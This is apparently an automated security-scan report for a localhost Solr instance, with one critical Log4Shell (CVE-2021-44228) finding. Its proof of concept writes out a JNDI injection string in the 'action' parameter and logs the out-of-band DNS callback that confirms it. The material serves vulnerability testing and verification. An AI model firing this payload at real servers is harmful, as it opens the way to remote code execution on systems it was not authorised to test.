# Capability-learning A

**Scope:** localhost, 127.0.0.1
**Date:** 2026-07-21 - 2026-07-21
**Risk Rating:** Critical
**Total Findings:** 1

---

## 1. Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — action

- **Severity:** CRITICAL
- **CVSS:** N/A
- **Endpoint:** http://localhost:8983/solr/admin/cores

**PoC:**
```
Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy}
Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
candidate_param=action verification=verified-oob
confirmation=P6 target=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy} status=None
outbound_probe: GET http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy}
callback_nonce='ty5awcsxpfybbnw74hd6vdvvzy' (carried only in the one outbound probe; control_bore_it=False)
confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=ty5awcsxpfybbnw74hd6vdvvzy path= received_at=1784612284.326
control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None
```

**Remediation:** N/A

---
